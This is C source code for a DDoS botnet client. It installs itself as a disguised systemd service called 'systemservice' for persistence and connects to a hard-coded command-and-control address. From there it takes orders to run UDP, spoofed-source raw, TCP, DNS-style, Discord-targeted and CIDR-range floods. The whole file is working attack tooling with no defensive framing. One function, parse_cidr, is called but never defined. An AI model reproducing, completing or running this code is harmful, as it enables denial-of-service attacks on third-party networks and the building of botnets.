#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <time.h>
#include <netinet/udp.h>
#include <stdint.h>
#include <fcntl.h>

#define MASTER_IP "74.48.69.117"
#define MASTER_PORT 1337
#define THREAD_COUNT 1024
#define BUFFER_SIZE 65535
#define PROCESS_COUNT 32
#define CONNECTION_TIMEOUT 5
#define MAX_PACKET_SIZE 4096
#define MAXTTL 255
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;

struct thread_data {
    int throttle;
    int thread_id;
    struct sockaddr_in sin;
};

// Function declarations
void init_rand(uint32_t x);
uint32_t rand_cmwc(void);
void *flood(void *par1);
void setup_ip_header(struct iphdr *iph);
void setup_udp_header(struct udphdr *udph);
unsigned short csum(unsigned short *buf, int nwords);

void install_persistence() {
    char current_path[1024];
    if (readlink("/proc/self/exe", current_path, sizeof(current_path)) == -1) {
        return;
    }

    // Create directories if they don't exist
    system("mkdir -p /usr/local/bin");
    system("mkdir -p /etc/systemd/system");
    
    // Copy binary with proper permissions
    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "cp %s /usr/local/bin/systemservice", current_path);
    system(cmd);
    system("chmod 755 /usr/local/bin/systemservice");
    system("chown root:root /usr/local/bin/systemservice");

    // Create service file with proper permissions
    FILE *service = fopen("/etc/systemd/system/systemservice.service", "w");
    if(service) {
        fprintf(service, "[Unit]\nDescription=System Service\nAfter=network.target\n\n"
                        "[Service]\nType=simple\nExecStart=/usr/local/bin/systemservice\n"
                        "Environment=RUNNING_AS_SERVICE=1\nRestart=always\n"
                        "RestartSec=1\n\n[Install]\nWantedBy=multi-user.target\n");
        fclose(service);
        system("chmod 644 /etc/systemd/system/systemservice.service");
        system("chown root:root /etc/systemd/system/systemservice.service");
    }

    // Reload and enable service
    system("systemctl daemon-reload");
    system("systemctl enable systemservice");
    system("systemctl start systemservice");
}

void tune_system() {
    struct rlimit limits = {999999, 999999};
    setrlimit(RLIMIT_NOFILE, &limits);
    
    int ret;
    ret = system("ulimit -n 999999");
    ret = system("sysctl -w net.ipv4.tcp_max_syn_backlog=65535");
    ret = system("sysctl -w net.core.somaxconn=65535");
    ret = system("sysctl -w net.ipv4.tcp_fin_timeout=10");
    ret = system("sysctl -w net.ipv4.tcp_tw_reuse=1");
    (void)ret;
}

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}

void setup_udp_header(struct udphdr *udph) {
    udph->source = htons(5678);
    udph->check = 0;
    udph->len = htons(sizeof(struct udphdr) + 1);
}

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *flood(void *par1) {
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    char new_ip[sizeof "255.255.255.255"];
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0) {
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);
    
    udph->dest = sin.sin_port;
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0) {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    
    int throttle = td->throttle;
    uint32_t random_num;
    uint32_t ul_dst;
    
    init_rand(time(NULL));
    
    while(1) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        random_num = rand_cmwc();
        ul_dst = (random_num >> 24 & 0xFF) << 24 |
                 (random_num >> 16 & 0xFF) << 16 |
                 (random_num >> 8 & 0xFF) << 8 |
                 (random_num & 0xFF);
        iph->saddr = ul_dst;
        udph->source = htons(random_num & 0xFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        if(throttle) usleep(throttle);
    }
}

void dns_amp(char *target, int port, int duration, int length) {
    int sockfd;
    struct sockaddr_in sin;
    char payload[8192];
    
    // DNS query packet structure
    char dns_payload[] = {
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x03, 'w', 'w', 'w',
        0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03,
        'c', 'o', 'm', 0x00, 0x00, 0x01, 0x00, 0x01
    };

    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target);

    time_t start_time = time(NULL);
    
    while(time(NULL) - start_time < duration) {
        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sockfd < 0) continue;
        
        // Randomize DNS transaction ID
        dns_payload[0] = rand() % 255;
        dns_payload[1] = rand() % 255;
        
        memcpy(payload, dns_payload, sizeof(dns_payload));
        
        for(int i = 0; i < 100; i++) {
            sendto(sockfd, payload, length, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
        
        close(sockfd);
        usleep(1000);
    }
}

void udpflood(char *target, int duration, int dport, int length) {
    int socks[PROCESS_COUNT];
    
    // Create multiple sockets for parallel sending
    for(int i = 0; i < PROCESS_COUNT; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(socks[i] < 0) continue;
        
        // Set socket options for high performance
        int buf_size = 65535;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        int opt_val = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val));
        
        // Set non-blocking
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
    }
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target);
    sin.sin_port = htons(dport);
    
    // Use specified length or default
    int packet_len = length > 0 ? length : 65500;
    
    // Create a single payload
    char *payload = malloc(packet_len);
    if (!payload) {
        perror("malloc");
        return;
    }
    memset(payload, 0, packet_len); // Initialize payload with zeros
    
    time_t start_time = time(NULL);
    unsigned int sent = 0;
    
    while(time(NULL) - start_time < duration) {
        for(int i = 0; i < PROCESS_COUNT; i++) {
            // Send packets as fast as possible
            for(int j = 0; j < 100; j++) {
                sendto(socks[i], payload, packet_len, MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(sin));
                sent++;
            }
        }
        
        // Throttle only for larger packets to avoid overwhelming the system
        if(packet_len > 1 && sent % 100000 == 0) {
            usleep(1000); // Minimal sleep to avoid CPU exhaustion
        }
    }
    
    // Cleanup
    free(payload);
    for(int i = 0; i < PROCESS_COUNT; i++) {
        close(socks[i]);
    }
    
    printf("[+] UDP Flood completed: %u packets sent\n", sent);
}

void udpbypass_flood(char *target, int duration, int dport, int length) {
    int socks[PROCESS_COUNT];
    
    // Create multiple raw sockets for parallel sending
    for(int i = 0; i < PROCESS_COUNT; i++) {
        socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(socks[i] < 0) {
            perror("socket");
            continue;
        }
        
        // Set socket options for high performance
        int buf_size = 65535;
        if (setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size)) < 0) {
            perror("setsockopt SO_SNDBUF");
        }
        int opt_val = 1;
        if (setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val)) < 0) {
            perror("setsockopt SO_REUSEADDR");
        }
        
        // Set non-blocking
        if (fcntl(socks[i], F_SETFL, O_NONBLOCK) < 0) {
            perror("fcntl O_NONBLOCK");
        }
    }
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target);
    sin.sin_port = htons(dport);
    
    // Use specified length or default
    int packet_len = length > 0 ? length : 65500;
    
    // Custom payloads for more legitimate traffic
    char *payloads[4];
    for(int i = 0; i < 4; i++) {
        payloads[i] = malloc(packet_len);
        if (!payloads[i]) {
            perror("malloc");
            exit(EXIT_FAILURE);
        }
        // Fill payload with more legitimate-looking data
        for(int j = 0; j < packet_len; j++) {
            // Simulate HTTP-like traffic or other common protocols
            if (j < 10) {
                payloads[i][j] = "GET / HTTP/1.1\r\n"[j % 16]; // Simulate HTTP GET request
            } else {
                payloads[i][j] = rand() % 255; // Fill the rest with random data
            }
        }
    }
    
    time_t start_time = time(NULL);
    unsigned int sent = 0;
    
    while(time(NULL) - start_time < duration) {
        for(int i = 0; i < PROCESS_COUNT; i++) {
            // Rotate through payloads for variability
            for(int j = 0; j < 4; j++) {
                // Randomize source IP and port for bypass
                struct sockaddr_in src_addr;
                src_addr.sin_family = AF_INET;
                src_addr.sin_addr.s_addr = rand(); // Random source IP
                src_addr.sin_port = htons(rand() % 65535); // Random source port
                
                // Construct UDP header
                struct udphdr udph;
                udph.source = src_addr.sin_port;
                udph.dest = sin.sin_port;
                udph.len = htons(sizeof(struct udphdr) + packet_len);
                udph.check = 0; // UDP checksum is optional for IPv4
                
                // Construct IP header
                struct iphdr iph;
                iph.ihl = 5;
                iph.version = 4;
                iph.tos = 0;
                iph.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packet_len);
                iph.id = htonl(rand() % 65535); // Random ID
                iph.frag_off = 0;
                iph.ttl = MAXTTL;
                iph.protocol = IPPROTO_UDP;
                iph.check = 0; // Will be calculated later
                iph.saddr = src_addr.sin_addr.s_addr; // Random source IP
                iph.daddr = sin.sin_addr.s_addr; // Target IP
                
                // Calculate IP checksum
                iph.check = csum((unsigned short *)&iph, sizeof(struct iphdr) >> 1);
                
                // Combine headers and payload
                char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packet_len];
                memcpy(packet, &iph, sizeof(struct iphdr));
                memcpy(packet + sizeof(struct iphdr), &udph, sizeof(struct udphdr));
                memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), payloads[j], packet_len);
                
                // Send the packet
                if (sendto(socks[i], packet, sizeof(packet), MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                    perror("sendto");
                }
                sent++;
            }
        }
        
        // Throttle only for larger packets to avoid overwhelming the system
        if(packet_len > 1 && sent % 100000 == 0) {
            usleep(1000); // Minimal sleep to avoid CPU exhaustion
        }
    }
    
    // Cleanup
    for(int i = 0; i < 4; i++) {
        free(payloads[i]);
    }
    for(int i = 0; i < PROCESS_COUNT; i++) {
        close(socks[i]);
    }
    
    printf("[+] UDP Bypass Flood completed: %u packets sent\n", sent);
}

void tcpysynack(char *target, int port, int duration, int length) {
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target);

    time_t start_time = time(NULL);
    
    // Connection pool
    int sockets[PROCESS_COUNT * 50];
    int socket_count = 0;

    while(time(NULL) - start_time < duration) {
        // Create new connections
        while(socket_count < PROCESS_COUNT * 50) {
            int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
            if(sock < 0) continue;

            // Set socket options
            int flag = 1;
            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
            setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &flag, sizeof(flag));

            // Random source port
            struct sockaddr_in src;
            src.sin_family = AF_INET;
            src.sin_port = htons(rand() % 65535);
            src.sin_addr.s_addr = INADDR_ANY;
            bind(sock, (struct sockaddr *)&src, sizeof(src));

            // Initiate connection
            connect(sock, (struct sockaddr *)&sin, sizeof(sin));
            
            sockets[socket_count++] = sock;
        }

        // Send legitimate-looking data
        for(int i = 0; i < socket_count; i++) {
            char request[1024];
            snprintf(request, sizeof(request),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n",
                target);
            
            send(sockets[i], request, strlen(request), MSG_NOSIGNAL);
        }

        // Close some random sockets and create new ones
        for(int i = 0; i < socket_count / 4; i++) {
            int idx = rand() % socket_count;
            close(sockets[idx]);
            sockets[idx] = sockets[--socket_count];
        }

        usleep(10000);
    }

    // Cleanup
    for(int i = 0; i < socket_count; i++) {
        close(sockets[i]);
    }
}

void discord_flood(char *target, int duration, int dport, int length) {
    int socks[PROCESS_COUNT];
    
    // Create multiple raw sockets for parallel sending
    for(int i = 0; i < PROCESS_COUNT; i++) {
        socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(socks[i] < 0) {
            perror("socket");
            continue;
        }
        
        // Set socket options for high performance
        int buf_size = 65535;
        if (setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size)) < 0) {
            perror("setsockopt SO_SNDBUF");
        }
        int opt_val = 1;
        if (setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val)) < 0) {
            perror("setsockopt SO_REUSEADDR");
        }
        
        // Set non-blocking
        if (fcntl(socks[i], F_SETFL, O_NONBLOCK) < 0) {
            perror("fcntl O_NONBLOCK");
        }
    }
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target);
    sin.sin_port = htons(dport);
    
    // Discord payloads
    char discord1_payload[] = "\x13\x37\xca\xfe\x01\x00\x00\x00";
    char discord2_payload[] = "\x94\x00\xb0\x1a\xef\x69\xa8\xa1\x59\x69\xba\xc5\x08\x00\x45\x00\x00\x43\xf0\x12\x00\x00\x80\x11\x00\x00\xc0\xa8\x64\x02\xb9\x29\x8e\x31\xc2\x30\xc3\x51\x00\x2f\x6c\x46\x90\xf8\x5f\x1b\x8e\xf5\x56\x8f\x00\x05\xe1\x26\x96\xa9\xde\xe8\x84\xba\x65\x38\x70\x68\xf5\x70\x0e\x12\xe2\x54\x20\xe0\x7f\x49\x0d\x9e\x44\x89\xec\x4b\x7f";
    
    time_t start_time = time(NULL);
    unsigned int sent = 0;
    
    while(time(NULL) - start_time < duration) {
        for(int i = 0; i < PROCESS_COUNT; i++) {
            // Rotate through payloads for variability
            for(int j = 0; j < 2; j++) {
                // Randomize source IP and port for bypass
                struct sockaddr_in src_addr;
                src_addr.sin_family = AF_INET;
                src_addr.sin_addr.s_addr = rand(); // Random source IP
                src_addr.sin_port = htons(rand() % 65535); // Random source port
                
                // Construct UDP header
                struct udphdr udph;
                udph.source = src_addr.sin_port;
                udph.dest = sin.sin_port;
                udph.len = htons(sizeof(struct udphdr) + (j == 0 ? sizeof(discord1_payload) : sizeof(discord2_payload)));
                udph.check = 0; // UDP checksum is optional for IPv4
                
                // Construct IP header
                struct iphdr iph;
                iph.ihl = 5;
                iph.version = 4;
                iph.tos = 0;
                iph.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + (j == 0 ? sizeof(discord1_payload) : sizeof(discord2_payload)));
                iph.id = htonl(rand() % 65535); // Random ID
                iph.frag_off = 0;
                iph.ttl = MAXTTL;
                iph.protocol = IPPROTO_UDP;
                iph.check = 0; // Will be calculated later
                iph.saddr = src_addr.sin_addr.s_addr; // Random source IP
                iph.daddr = sin.sin_addr.s_addr; // Target IP
                
                // Calculate IP checksum
                iph.check = csum((unsigned short *)&iph, sizeof(struct iphdr) >> 1);
                
                // Combine headers and payload
                char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + (j == 0 ? sizeof(discord1_payload) : sizeof(discord2_payload))];
                memcpy(packet, &iph, sizeof(struct iphdr));
                memcpy(packet + sizeof(struct iphdr), &udph, sizeof(struct udphdr));
                memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), j == 0 ? discord1_payload : discord2_payload, j == 0 ? sizeof(discord1_payload) : sizeof(discord2_payload));
                
                // Send the packet
                if (sendto(socks[i], packet, sizeof(packet), MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                    perror("sendto");
                }
                sent++;
            }
        }
        
        // Throttle only for larger packets to avoid overwhelming the system
        if(sent % 100000 == 0) {
            usleep(1000); // Minimal sleep to avoid CPU exhaustion
        }
    }
    
    // Cleanup
    for(int i = 0; i < PROCESS_COUNT; i++) {
        close(socks[i]);
    }
    
    printf("[+] Discord Flood completed: %u packets sent\n", sent);
}

void range_flood(char *cidr_target, int duration, int dport, int length) {
    uint32_t network, broadcast;
    parse_cidr(cidr_target, &network, &broadcast);
    uint32_t total_ips = broadcast - network + 1;
    
    int socks[PROCESS_COUNT * 2];
    for(int i = 0; i < PROCESS_COUNT * 2; i++) {
        socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(socks[i] < 0) continue;
        
        int buf_size = 524288;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        int opt_val = 1;
        setsockopt(socks[i], IPPROTO_IP, IP_HDRINCL, &opt_val, sizeof(opt_val));
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
    }
    
    int packet_len = (length > 0) ? length : 1200;
    char *payload = malloc(packet_len);
    for(int i = 0; i < packet_len; i++) {
        payload[i] = rand() % 255;
    }
    
    time_t start_time = time(NULL);
    unsigned int sent = 0;
    uint32_t current_ip = network;
    
    while(time(NULL) - start_time < duration) {
        // Cycle through entire range systematically
        for(uint32_t offset = 0; offset < total_ips; offset++) {
            current_ip = network + offset;
            
            struct sockaddr_in sin;
            sin.sin_family = AF_INET;
            sin.sin_port = htons(dport);
            sin.sin_addr.s_addr = htonl(current_ip);
            
            for(int i = 0; i < PROCESS_COUNT * 2; i++) {
                struct iphdr iph;
                struct udphdr udph;
                
                iph.ihl = 5;
                iph.version = 4;
                iph.tos = (rand() % 4) << 5;
                iph.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packet_len);
                iph.id = htons(rand() % 65535);
                iph.frag_off = 0;
                iph.ttl = 64 + (rand() % 128);
                iph.protocol = IPPROTO_UDP;
                iph.check = 0;
                iph.saddr = rand();
                iph.daddr = sin.sin_addr.s_addr;
                
                udph.source = htons(rand() % 65535);
                udph.dest = sin.sin_port;
                udph.len = htons(sizeof(struct udphdr) + packet_len);
                udph.check = 0;
                
                char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packet_len];
                memcpy(packet, &iph, sizeof(struct iphdr));
                memcpy(packet + sizeof(struct iphdr), &udph, sizeof(struct udphdr));
                memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), payload, packet_len);
                
                iph.check = csum((unsigned short *)&iph, sizeof(struct iphdr) >> 1);
                
                // Hit each IP multiple times
                for(int j = 0; j < 20; j++) {
                    sendto(socks[i], packet, sizeof(packet), MSG_NOSIGNAL, 
                           (struct sockaddr *)&sin, sizeof(sin));
                    sent++;
                }
            }
        }
        
        if(sent % 20000 == 0) {
            usleep(100); // Very minimal throttling
        }
    }
    
    free(payload);
    for(int i = 0; i < PROCESS_COUNT * 2; i++) {
        close(socks[i]);
    }
}

void attack(char *command) {
    char *method = strtok(command, " ");
    char *target = strtok(NULL, " ");
    char *time_str = strtok(NULL, " ");
    char *params = strtok(NULL, "\n");
    
    if(!method || !target || !time_str) return;
    
    int duration = atoi(time_str);
    int dport = 0;
    int length = 0;
    
    // Parse parameters
    if(params) {
        char *param = strtok(params, " ");
        while(param) {
            if(strncmp(param, "dport=", 6) == 0) {
                dport = atoi(param + 6);
            }
            else if(strncmp(param, "len=", 4) == 0) {
                length = atoi(param + 4);
            }
            param = strtok(NULL, " ");
        }
    }

    // Launch attacks based on method
    if(strcmp(method, "udpplain") == 0) {
        udpflood(target, duration, dport, length);
    }
    else if(strcmp(method, "tcpplain") == 0) {
        tcpysynack(target, dport, duration, length);
    }
    else if(strcmp(method, "dns-amp") == 0) {
        dns_amp(target, dport, duration, length);
    }

    else if(strcmp(method, "range") == 0) {
        range_flood(target, dport, duration, length);
    }

    else if(strcmp(method, "udpbypass") == 0) {
        udpbypass_flood(target, duration, dport, length);
    }
    else if(strcmp(method, "discord") == 0) {
        discord_flood(target, duration, dport, length);
    }
    
    // Kill child processes
    int status;
    while(waitpid(-1, &status, WNOHANG) > 0);
}

int main(void) {
    if(geteuid() != 0) {
        printf("Error: This program must be run as root\n");
        return 1;
    }
    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL));
    tune_system();
    
    // Check if running as normal process
    if (getenv("RUNNING_AS_SERVICE") == NULL) {
        // Stop and remove existing service
        system("systemctl stop systemservice >/dev/null 2>&1");
        system("systemctl disable systemservice >/dev/null 2>&1");
        system("rm -f /etc/systemd/system/systemservice.service");
        system("rm -f /usr/local/bin/systemservice");
        
        // Install fresh copy
        install_persistence();
        printf("[+] Installation complete\n");
        sleep(2);
        return 0;
    }
    
    // Running as service, connect to master
    while(1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(MASTER_PORT);
        addr.sin_addr.s_addr = inet_addr(MASTER_IP);
        
        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != -1) {
            char ident[128];
            snprintf(ident, sizeof(ident), "BOT_READY\n");
            send(sock, ident, strlen(ident), MSG_NOSIGNAL);
            
            char buffer[1024];
            int len;
            
            while(1) {
                len = recv(sock, buffer, sizeof(buffer), 0);
                if(len <= 0) break;
                
                buffer[len] = '\0';
                attack(buffer);
            }
        }
        close(sock);
        sleep(5);
    }
    return 0;
}
